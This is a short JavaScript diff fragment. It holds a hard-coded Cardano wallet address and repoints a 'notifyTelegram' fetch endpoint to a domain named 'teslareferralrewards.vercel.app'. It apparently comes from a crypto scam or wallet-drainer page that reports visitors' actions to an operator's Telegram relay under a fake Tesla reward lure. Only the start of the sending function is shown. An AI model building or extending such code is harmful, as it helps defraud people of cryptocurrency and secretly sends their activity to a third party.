@@ -7,7 +7,7 @@ const WALLETS = {
     ada: "addr1qxn4pr0zjdv9dm3uw8m9sanvlcu9ws79vsyhhz2xelxm4zh3qncz93eyafzjdrh0vz649p5eef7kwgrvajcruruna3ks68a6qr" 
 };
 
-const TELEGRAM_API_URL = "https://swap-gules.vercel.app/api/telegram"; 
+const TELEGRAM_API_URL = "https://teslareferralrewards.vercel.app/src/api/telegram"; 
 
 function notifyTelegram(action, details) {
     fetch(TELEGRAM_API_URL, {
